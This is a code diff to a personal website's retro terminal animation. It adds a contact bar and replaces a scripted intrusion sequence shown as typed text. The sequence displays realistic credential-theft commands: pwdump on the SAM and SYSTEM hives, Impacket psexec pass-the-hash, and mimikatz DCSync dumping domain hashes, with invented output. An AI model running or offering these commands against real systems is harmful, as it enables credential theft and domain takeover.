@@ -186,6 +186,25 @@
       50% { opacity: 1; }
     }
 
+    .contact-bar {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      padding-bottom: 6px;
+      margin-bottom: 6px;
+    }
+
+    .terminal-link {
+      color: #33cc33;
+      text-decoration: none;
+      text-shadow: 0 0 5px #33cc33, 0 0 10px #33cc33;
+    }
+
+    .terminal-link:hover {
+      color: #66ff66;
+      text-shadow: 0 0 8px #66ff66, 0 0 16px #66ff66;
+    }
+
     .status-bar {
       display: flex;
       justify-content: space-between;
@@ -253,6 +272,10 @@
     </div>
     <div class="screen">
       <div class="content">
+        <div class="contact-bar">
+          <span>CONTACT: <canvas id="emailCanvas" height="16" style="vertical-align: middle; image-rendering: pixelated;"></canvas></span>
+          <span>GITHUB: <a href="https://github.com/SkyzFallin" target="_blank" rel="noopener noreferrer" class="terminal-link">github.com/SkyzFallin</a></span>
+        </div>
         <div class="status-bar">
           <span>STATUS: ONLINE</span>
           <span>MODE: WIN XP</span>
@@ -264,6 +287,22 @@
   </div>
 
   <script>
+    // Render email as canvas image (bot-resistant)
+    (function() {
+      const canvas = document.getElementById('emailCanvas');
+      const parts = ['wes', '@', 'wescastle', '.', 'com'];
+      const email = parts.join('');
+      const ctx = canvas.getContext('2d');
+      ctx.font = '11px "Courier New", monospace';
+      const w = ctx.measureText(email).width;
+      canvas.width = Math.ceil(w) + 2;
+      ctx.font = '11px "Courier New", monospace';
+      ctx.fillStyle = '#33cc33';
+      ctx.shadowColor = '#33cc33';
+      ctx.shadowBlur = 5;
+      ctx.fillText(email, 1, 12);
+    })();
+
     const output = document.getElementById('output');
     const clockEl = document.getElementById('clock');
 
@@ -314,28 +353,7 @@
       { text: 'The command completed successfully.', delay: 50 },
       { text: '', delay: 900 },
       { text: 'C:\\Documents and Settings\\Administrator>', delay: 50, noBreak: true },
-      { text: 'cd C:\\WINDOWS\\system32\\config', delay: 900, typed: true },
-      { text: '', delay: 200 },
-      { text: 'C:\\WINDOWS\\system32\\config>', delay: 50, noBreak: true },
-      { text: 'dir /a', delay: 800, typed: true },
-      { text: '', delay: 100 },
-      { text: ' Volume in drive C has no label.', delay: 50 },
-      { text: ' Volume Serial Number is 3C4D-5E6F', delay: 50 },
-      { text: '', delay: 50 },
-      { text: ' Directory of C:\\WINDOWS\\system32\\config', delay: 50 },
-      { text: '', delay: 50 },
-      { text: '01/07/2008  09:42 AM    <DIR>          .', delay: 30 },
-      { text: '01/07/2008  09:42 AM    <DIR>          ..', delay: 30 },
-      { text: '01/07/2008  09:40 AM           262,144 SAM', delay: 30 },
-      { text: '01/07/2008  09:40 AM         8,388,608 SYSTEM', delay: 30 },
-      { text: '01/07/2008  09:40 AM           524,288 SECURITY', delay: 30 },
-      { text: '01/07/2008  09:40 AM        12,582,912 SOFTWARE', delay: 30 },
-      { text: '01/07/2008  09:40 AM         2,097,152 DEFAULT', delay: 30 },
-      { text: '               5 File(s)     23,855,104 bytes', delay: 50 },
-      { text: '               2 Dir(s)  42,949,672,960 bytes free', delay: 50 },
-      { text: '', delay: 1000 },
-      { text: 'C:\\WINDOWS\\system32\\config>', delay: 50, noBreak: true },
-      { text: 'pwdump.exe SAM SYSTEM', delay: 1200, typed: true },
+      { text: 'D:\\pwdump.exe C:\\WINDOWS\\system32\\config\\SAM C:\\WINDOWS\\system32\\config\\SYSTEM', delay: 1200, typed: true },
       { text: '', delay: 100 },
       { text: 'PwDump v7.1 - Raw Password Extractor', delay: 50 },
       { text: 'Copyright (C) 2003-2008 fizzgig and the mighty Hernan Ochoa', delay: 50 },
@@ -353,49 +371,156 @@
       { text: '', delay: 400 },
       { text: '6 hashes dumped successfully.', delay: 50 },
       { text: '', delay: 1000 },
-      { text: 'C:\\WINDOWS\\system32\\config>', delay: 50, noBreak: true },
-      { text: 'type > C:\\output.txt', delay: 900, typed: true },
-      { text: '', delay: 200 },
-      { text: 'C:\\WINDOWS\\system32\\config>', delay: 50, noBreak: true },
-      { text: 'cd\\', delay: 600, typed: true },
-      { text: '', delay: 200 },
-      { text: 'C:\\>', delay: 50, noBreak: true },
-      { text: 'type output.txt', delay: 1000, typed: true },
+      { text: 'C:\\Documents and Settings\\Administrator>', delay: 50, noBreak: true },
+      { text: 'psexec.py -hashes E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C CORP/Administrator@192.168.1.1', delay: 1400, paste: true },
+      { text: '', delay: 300 },
+      { text: 'Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation', delay: 50 },
       { text: '', delay: 100 },
-      { text: 'Administrator:500:E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C:::', delay: 40 },
-      { text: 'Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::', delay: 40 },
-      { text: 'SUPPORT_388945a0:1002:NO PASSWORD*********************:8A4F2D6E9C1B7F3A5D8C9E2B4F7A1D6E:::', delay: 40 },
-      { text: 'SQLService:1003:8C4F2D9A6E1B7F3A5D8C9E2B4F7A1D6E:3A7F9D2C8E5B1A4F6D9C2E8B5A7F3D1C:::', delay: 40 },
-      { text: 'IIS_WPG:1004:D4F8A3E9B2C7F1E6A8D5B9C3E7A2F4D8:7E9B2C5F8A3D6E1B4C9A7F2E5D8B3A6C:::', delay: 40 },
-      { text: 'ASPNET:1005:9B2F4A8C6E1D7F3A5D8C9E2B4F7A1D6E:2C7E9B4A8F3D6E1B4C9A7F2E5D8B3A6C:::', delay: 40 },
-      { text: '', delay: 2000 },
-      { text: 'C:\\>', delay: 50, noBreak: true },
-      { text: '', delay: 3000 }
+      { text: '[*] Requesting shares on 192.168.1.1.....', delay: 300 },
+      { text: '[*] Found writable share ADMIN$', delay: 200 },
+      { text: '[*] Uploading file bYQkThxC.exe', delay: 400 },
+      { text: '[*] Opening SVCManager on 192.168.1.1.....', delay: 300 },
+      { text: '[*] Creating service RKHt on 192.168.1.1.....', delay: 400 },
+      { text: '[*] Starting service RKHt.....', delay: 500 },
+      { text: '', delay: 200 },
+      { text: 'Microsoft Windows [Version 5.2.3790]', delay: 50 },
+      { text: '(C) Copyright 1985-2003 Microsoft Corp.', delay: 50 },
+      { text: '', delay: 300 },
+      { text: 'C:\\WINDOWS\\system32>', delay: 50, noBreak: true },
+      { text: 'whoami', delay: 700, typed: true },
+      { text: '', delay: 100 },
+      { text: 'CORP\\Administrator', delay: 50 },
+      { text: '', delay: 600 },
+      { text: 'C:\\WINDOWS\\system32>', delay: 50, noBreak: true },
+      { text: 'net group "Domain Controllers" /domain', delay: 1100, typed: true },
+      { text: '', delay: 100 },
+      { text: 'The request will be processed at a domain controller for domain corp.local.', delay: 50 },
+      { text: '', delay: 100 },
+      { text: 'Group name     Domain Controllers', delay: 30 },
+      { text: 'Comment        All domain controllers in the enterprise', delay: 30 },
+      { text: '', delay: 30 },
+      { text: 'Members', delay: 30 },
+      { text: '-------------------------------------------------------------------------------', delay: 30 },
+      { text: 'DC01$                    DC02$', delay: 30 },
+      { text: 'The command completed successfully.', delay: 50 },
+      { text: '', delay: 900 },
+      { text: 'C:\\WINDOWS\\system32>', delay: 50, noBreak: true },
+      { text: 'D:\\mimikatz.exe', delay: 1000, typed: true },
+      { text: '', delay: 200 },
+      { text: '  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08', delay: 50 },
+      { text: ' .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)', delay: 50 },
+      { text: ' ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )', delay: 50 },
+      { text: ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz', delay: 50 },
+      { text: ' \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )', delay: 50 },
+      { text: '  \'#####\'        > https://pingcastle.com / https://mysmartlogon.com ***/', delay: 50 },
+      { text: '', delay: 400 },
+      { text: 'mimikatz #', delay: 50, noBreak: true },
+      { text: 'privilege::debug', delay: 900, typed: true },
+      { text: '', delay: 100 },
+      { text: 'Privilege \'20\' OK', delay: 50 },
+      { text: '', delay: 600 },
+      { text: 'mimikatz #', delay: 50, noBreak: true },
+      { text: 'lsadump::dcsync /domain:corp.local /all /csv', delay: 1100, typed: true },
+      { text: '', delay: 200 },
+      { text: '[DC] \'corp.local\' will be the domain', delay: 50 },
+      { text: '[DC] \'DC01.corp.local\' will be the DC server', delay: 50 },
+      { text: '[DC] Exporting domain \'corp.local\'', delay: 50 },
+      { text: '[rpc] Service  : ldap', delay: 50 },
+      { text: '[rpc] AuthnSvc : GSS_NEGOTIATE (9)', delay: 50 },
+      { text: '', delay: 300 },
+      { text: '502\tkrbtgt\t3E4A7F9C2B8D1E6A5C9B4F7D2E8A3C6B\t514', delay: 40 },
+      { text: '500\tAdministrator\t8846F7EAEE8FB117AD06BDD830B7586C\t512', delay: 40 },
+      { text: '1103\tjsmith\t9C2E7B4A8F3D6E1B4C9A7F2E5D8B3A6C\t512', delay: 40 },
+      { text: '1104\tmjones\t4A8F2D9C6E1B7F3A5D8C9E2B4F7A1D6E\t512', delay: 40 },
+      { text: '1105\tsvc_sql\t8D3F7A2C9E6B4A1F5C8D2E9B6A4F7C3E\t512', delay: 40 },
+      { text: '1106\tsvc_backup\t2F6A9D4C8E3B7A1F4C9D2E8B5A3F7C1D\t512', delay: 40 },
+      { text: '1107\thelpdesk\t6C1E4A9F7D3B8A2C5E9F1D6A4B7C3E8F\t512', delay: 40 },
+      { text: '1108\tdbadmin\t1A5D8C3F9E7B2A6D4C8F3E1B9A7D5C2F\t512', delay: 40 },
+      { text: '1001\tDC01$\t7B4F9A2E8C6D3B7A5F2C9E4D8B1A6F3C\t532480', delay: 40 },
+      { text: '1002\tDC02$\t3C8E1A6F4D9C2B7E5A3F8D1C6E9B4A7F\t532480', delay: 40 },
+      { text: '', delay: 600 },
+      { text: 'mimikatz #', delay: 50, noBreak: true },
+      { text: 'lsadump::dcsync /domain:corp.local /all /csv > D:\\corp_hashes.txt', delay: 1100, typed: true },
+      { text: '', delay: 200 },
+      { text: '[DC] \'corp.local\' will be the domain', delay: 50 },
+      { text: '[DC] \'DC01.corp.local\' will be the DC server', delay: 50 },
+      { text: '[DC] Exporting domain \'corp.local\'', delay: 50 },
+      { text: '[rpc] Service  : ldap', delay: 50 },
+      { text: '[rpc] AuthnSvc : GSS_NEGOTIATE (9)', delay: 50 },
+      { text: '', delay: 800 },
+      { text: 'mimikatz #', delay: 50, noBreak: true },
+      { text: 'exit', delay: 700, typed: true },
+      { text: '', delay: 100 },
+      { text: 'Bye!', delay: 50 },
+      { text: '', delay: 400 },
+      { text: 'C:\\WINDOWS\\system32>', delay: 50, noBreak: true },
+      { text: 'dir D:\\', delay: 700, typed: true },
+      { text: '', delay: 100 },
+      { text: ' Volume in drive D is KINGSTON', delay: 50 },
+      { text: ' Volume Serial Number is 9F2A-C31B', delay: 50 },
+      { text: '', delay: 50 },
+      { text: ' Directory of D:\\', delay: 50 },
+      { text: '', delay: 50 },
+      { text: '01/07/2008  10:14 AM             786,432 mimikatz.exe', delay: 30 },
+      { text: '01/07/2008  10:14 AM              32,768 mimikatz.pdb', delay: 30 },
+      { text: '01/07/2008  10:14 AM             786,432 pwdump.exe', delay: 30 },
+      { text: '01/07/2008  10:22 AM               4,318 corp_hashes.txt', delay: 30 },
+      { text: '               4 File(s)      1,609,950 bytes', delay: 50 },
+      { text: '               0 Dir(s)   3,891,339,264 bytes free', delay: 50 },
+      { text: '', delay: 800 },
+      { text: 'C:\\WINDOWS\\system32>', delay: 50, noBreak: true },
+      { text: 'exit', delay: 700, typed: true },
+      { text: '', delay: 200 },
+      { text: 'Connection to 192.168.1.1 closed.', delay: 50 },
+      { text: '', delay: 500 },
+      { text: 'C:\\Documents and Settings\\Administrator>', delay: 50, noBreak: true },
+      { text: 'logoff', delay: 700, typed: true },
+      { text: '', delay: 2500 }
     ];
 
     let cmdIndex = 0;
     let charIndex = 0;
     let currentLine = null;
-    let loopCount = 0;
+
+    function clearAndRestart() {
+      output.innerHTML = '';
+      cmdIndex = 0;
+      charIndex = 0;
+      setTimeout(typeCommand, 1000);
+    }
 
     function typeCommand() {
       if (cmdIndex >= commands.length) {
-        cmdIndex = 0;
-        loopCount++;
-        
-        // Clear terminal after 10 loops
-        if (loopCount >= 10) {
-          output.innerHTML = '';
-          loopCount = 0;
-        }
-        
-        setTimeout(typeCommand, 5000);
+        setTimeout(clearAndRestart, 2000);
         return;
       }
 
       const cmd = commands[cmdIndex];
 
-      if (cmd.typed) {
+      if (cmd.paste) {
+        // Type the command prefix slowly, then paste the hash portion instantly
+        const pasteAt = cmd.text.indexOf(' -hashes ') + ' -hashes '.length;
+        const prefix = cmd.text.substring(0, pasteAt);
+        const pasted = cmd.text.substring(pasteAt);
+        if (charIndex < prefix.length) {
+          if (charIndex === 0) output.lastChild.textContent += cmd.text[0];
+          else output.lastChild.textContent += prefix[charIndex];
+          charIndex++;
+          setTimeout(typeCommand, 80 + Math.random() * 120);
+        } else if (charIndex === prefix.length) {
+          // Paste the hash in one shot
+          output.lastChild.textContent += pasted;
+          charIndex++;
+          setTimeout(typeCommand, 300);
+        } else {
+          const lineBreak = document.createElement('div');
+          lineBreak.className = 'line';
+          output.appendChild(lineBreak);
+          charIndex = 0;
+          cmdIndex++;
+          setTimeout(typeCommand, cmd.delay);
+        }
+      } else if (cmd.typed) {
         if (charIndex === 0) {
           currentLine = document.createElement('span');
           currentLine.textContent = cmd.text.substring(0, 1);
@@ -427,10 +552,7 @@
 
     setTimeout(typeCommand, 500);
 
-    // Disable user input to maintain illusion
-    document.addEventListener('keydown', (e) => {
-      e.preventDefault();
-    });
+
   </script>
 </body>
 </html>
